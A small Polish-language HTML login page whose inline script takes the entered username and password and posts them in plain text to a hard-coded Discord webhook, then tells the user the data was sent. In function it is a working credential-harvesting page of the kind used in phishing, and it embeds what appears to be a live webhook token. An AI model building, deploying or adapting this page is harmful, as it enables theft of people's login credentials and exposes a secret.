<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Logowanie - wysyłanie do Discorda</title>
  <style>
    body {
      background: #121212;
      color: white;
      font-family: Arial, sans-serif;
      padding: 2rem;
      max-width: 400px;
      margin: auto;
    }
    input, button {
      display: block;
      width: 100%;
      margin: 0.5rem 0;
      padding: 0.5rem;
      border-radius: 5px;
      border: none;
      font-size: 1rem;
    }
    button {
      background: #1DB954;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background: #17a54d;
    }
    #message {
      margin-top: 1rem;
      font-size: 0.9rem;
      min-height: 1.2em;
    }
  </style>
</head>
<body>

  <h1>Zaloguj się</h1>

  <form id="loginForm">
    <input type="text" name="username" placeholder="Login" required />
    <input type="password" name="password" placeholder="Hasło" required minlength="8" />
    <button type="submit">Zaloguj się</button>
  </form>

  <div id="message"></div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1399272439778771044/tKsun2HWGdUCEk-Lspm1D6ILN9bPVouDhyHlwzwN-f0a0nQWOec_F50zo6e2hypeAffw";

    const form = document.getElementById('loginForm');
    const messageDiv = document.getElementById('message');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      messageDiv.textContent = 'Wysyłanie...';

      const formData = new FormData(form);
      const username = formData.get('username');
      const password = formData.get('password');

      const payload = {
        content: `**Nowe logowanie:**\nLogin: \`${username}\`\nHasło: \`${password}\``
      };

      try {
        const res = await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (res.ok) {
          messageDiv.style.color = 'limegreen';
          messageDiv.textContent = 'Dane zostały wysłane do Discorda ✅';
          form.reset();
        } else {
          messageDiv.style.color = 'tomato';
          messageDiv.textContent = `Błąd wysyłania: ${res.status} ${res.statusText}`;
        }
      } catch (err) {
        messageDiv.style.color = 'tomato';
        messageDiv.textContent = 'Błąd sieci: ' + err.message;
      }
    });
  </script>

</body>
</html>
